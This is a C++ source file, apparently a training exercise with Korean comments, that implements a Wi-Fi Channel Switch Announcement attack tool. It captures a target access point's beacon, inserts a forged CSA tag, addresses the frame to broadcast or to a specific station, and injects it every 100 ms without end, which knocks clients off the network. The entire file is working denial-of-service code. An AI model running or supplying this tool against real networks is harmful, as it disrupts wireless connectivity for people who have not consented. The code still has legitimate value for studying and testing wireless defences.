#include <iostream>
#include <vector>
#include <cstring>
#include <cstdio>
#include <pcap.h>
#include <chrono>
#include <thread>
#include <arpa/inet.h>

using namespace std;

const int MIN_80211_HDR = 24;          // Dot11FrameHeader 길이
const int FIXED_PARAMS_LEN = 12;      // BeaconFixedParameters 길이
const uint8_t CSA_TAG[5] = {0x25, 0x03, 0x01, 0x0b, 0x03};  // CSA 태그
const unsigned char BROADCAST_MAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

/*
 * MAC 주소 문자열("00:11:22:33:44:55")를 6바이트 배열로 파싱
 */
bool parse_mac(const string &mac_str, unsigned char *mac) {
    if (mac_str.size() != 17) return false;
    int vals[6];
    if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6)
        return false;
    for (int i = 0; i < 6; i++)
        mac[i] = static_cast<unsigned char>(vals[i]);
    return true;
}

/*
 * AP 주소(addr2, addr3)가 설정한 MAC과 일치하는 Beacon 프레임만 캡처
 */
bool capture_beacon(pcap_t *handle, const unsigned char *ap_mac, vector<uint8_t>& radiotap_hdr, vector<uint8_t>& dot11_frame) {
    const u_char *packet = nullptr;
    struct pcap_pkthdr *header = nullptr;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;  // 타임아웃
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            cerr << "[!] Error capturing packets: " << pcap_geterr(handle) << endl;
            return false;
        }

        uint16_t rtap_len = packet[2] | (packet[3] << 8);  // Radiotap 헤더 길이
        if (header->caplen < static_cast<bpf_u_int32>(rtap_len) + MIN_80211_HDR + FIXED_PARAMS_LEN)
            continue;

        const uint8_t *dot11 = packet + rtap_len;
        uint16_t frame_control = dot11[0] | (dot11[1] << 8);

        // Beacon Frame 확인: Type = 0, Subtype = 8
        if ((frame_control & 0x0C) != 0x00 || ((frame_control >> 4) & 0xF) != 8)
            continue;

        // AP MAC 확인: addr2와 addr3 모두 AP MAC과 일치
        if (memcmp(dot11 + 10, ap_mac, 6) != 0 || memcmp(dot11 + 16, ap_mac, 6) != 0)
            continue;

        // 조건에 맞는 패킷 발견: Radiotap과 802.11 Frame을 분리하여 저장
        radiotap_hdr.assign(packet, packet + rtap_len);
        dot11_frame.assign(dot11, dot11 + header->caplen - rtap_len);
        return true;
    }
}

/*
 * Beacon Frame에서 CSA 태그를 삽입한 802.11 프레임 생성
 */
vector<uint8_t> modify_beacon_frame(const vector<uint8_t>& dot11_frame, const unsigned char *ap_mac, const unsigned char *sta_mac, bool has_station) {
    int fixed_offset = MIN_80211_HDR + FIXED_PARAMS_LEN;  // 36바이트
    
    if (dot11_frame.size() < static_cast<size_t>(fixed_offset)) {
        cerr << "[!] Beacon frame too short." << endl;
        return vector<uint8_t>();
    }

    const uint8_t* original_tags_ptr = dot11_frame.data() + fixed_offset;
    int original_tags_len = dot11_frame.size() - fixed_offset;

    // CSA 태그 삽입 위치 결정
    int insertion_point = 0;
    while (insertion_point + 2 <= original_tags_len) {
        uint8_t tag_num = original_tags_ptr[insertion_point];
        uint8_t tag_len = original_tags_ptr[insertion_point + 1];
        if (tag_num > CSA_TAG[0]) break;
        insertion_point += 2 + tag_len;
    }

    vector<uint8_t> channel_switch_tags;
    channel_switch_tags.insert(channel_switch_tags.end(), original_tags_ptr, original_tags_ptr + insertion_point);
    channel_switch_tags.insert(channel_switch_tags.end(), CSA_TAG, CSA_TAG + sizeof(CSA_TAG));
    channel_switch_tags.insert(channel_switch_tags.end(), original_tags_ptr + insertion_point, original_tags_ptr + original_tags_len);

    vector<uint8_t> new_dot11;
    new_dot11.insert(new_dot11.end(), dot11_frame.begin(), dot11_frame.begin() + fixed_offset);
    new_dot11.insert(new_dot11.end(), channel_switch_tags.begin(), channel_switch_tags.end());

    // MAC 헤더 수정
    if (new_dot11.size() >= static_cast<size_t>(MIN_80211_HDR)) {
        if (has_station)
            memcpy(&new_dot11[4], sta_mac, 6);
        else
            memcpy(&new_dot11[4], BROADCAST_MAC, 6);
        memcpy(&new_dot11[10], ap_mac, 6);
        memcpy(&new_dot11[16], ap_mac, 6);
    }
    return new_dot11;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        cerr << "syntax : csa-attack <interface> <ap mac> [<station mac>]" << endl;
        cerr << "syntax: csa-attack <interface> <ap mac> [<station mac>]" << endl;
        return 1;
    }

    string interface = argv[1];
    string ap_mac_str = argv[2];
    string sta_mac_str;
    bool has_station = (argc >= 4);
    if (has_station) sta_mac_str = argv[3];

    unsigned char ap_mac[6];
    if (!parse_mac(ap_mac_str, ap_mac)) {
        cerr << "[!] Invalid AP MAC address." << endl;
        return 1;
    }

    unsigned char sta_mac[6];
    if (has_station && !parse_mac(sta_mac_str, sta_mac)) {
        cerr << "[!] Invalid Station MAC address." << endl;
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        cerr << "[!] Failed to open interface: " << errbuf << endl;
        return 1;
    }

    cout << "[*] Waiting for beacon frame from AP " << ap_mac_str << " ..." << endl;

    vector<uint8_t> radiotap_hdr;
    vector<uint8_t> dot11_frame;

    if (!capture_beacon(handle, ap_mac, radiotap_hdr, dot11_frame)) {
        cerr << "[!] Failed to capture beacon frame from AP " << ap_mac_str << endl;
        pcap_close(handle);
        return 1;
    }

    vector<uint8_t> new_dot11 = modify_beacon_frame(dot11_frame, ap_mac, sta_mac, has_station);
    if (new_dot11.empty()) {
        cerr << "[!] Failed to modify beacon frame." << endl;
        pcap_close(handle);
        return 1;
    }

    vector<uint8_t> final_packet;
    final_packet.insert(final_packet.end(), radiotap_hdr.begin(), radiotap_hdr.end());
    final_packet.insert(final_packet.end(), new_dot11.begin(), new_dot11.end());

    cout << "[*] Starting packet injection on interface: " << interface << endl;
    while (true) {
        if (pcap_sendpacket(handle, final_packet.data(), final_packet.size()) != 0) {
            cerr << "[!] Error sending packet: " << pcap_geterr(handle) << endl;
        }
        this_thread::sleep_for(chrono::milliseconds(100));
    }

    pcap_close(handle);
    return 0;
}
